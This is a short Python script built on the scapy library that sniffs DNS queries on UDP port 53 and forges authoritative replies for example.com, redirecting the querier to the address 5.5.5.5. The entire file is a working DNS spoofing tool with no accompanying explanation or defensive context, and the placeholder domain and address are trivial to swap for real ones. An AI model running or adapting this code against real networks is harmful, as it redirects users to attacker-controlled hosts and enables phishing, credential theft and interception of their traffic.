from scapy.all import *
import os

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNS].qd.qname == b"example.com.":
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,\
                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='5.5.5.5'))
        send(spoofed_pkt)

def main():
    print("Starting DNS spoofing...")
    sniff(filter="udp port 53", prn=dns_spoof)

if __name__ == "__main__":
    main()